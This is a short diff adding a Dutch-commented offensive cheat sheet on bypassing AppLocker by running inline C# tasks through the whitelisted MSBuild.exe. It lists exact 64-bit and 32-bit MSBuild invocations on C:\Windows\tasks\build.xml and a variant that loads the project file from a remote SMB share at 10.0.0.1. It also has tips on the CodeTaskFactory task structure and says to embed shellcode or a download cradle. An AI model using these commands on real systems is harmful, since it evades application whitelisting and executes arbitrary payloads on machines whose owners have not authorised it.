@@ -1,0 +1,11 @@
+# AppLocker bypass via MSBuild.exe (whitelisted .NET binary)
+# MSBuild voert inline C# taken uit vanuit een XML project bestand
+# Stap 1: Maak build.xml met inline task (shellcode/download cradle)
+# Stap 2: Uitvoeren
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Windows\tasks\build.xml
+# 32-bit variant:
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Windows\tasks\build.xml
+# Remote XML laden (niet altijd mogelijk):
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe \\10.0.0.1\share\build.xml
+# Tip: Inline task moet <UsingTask> met TaskFactory="CodeTaskFactory" bevatten
+# Tip: AssemblyFile="Microsoft.Build.Tasks.v4.0.dll" voor .NET referenties
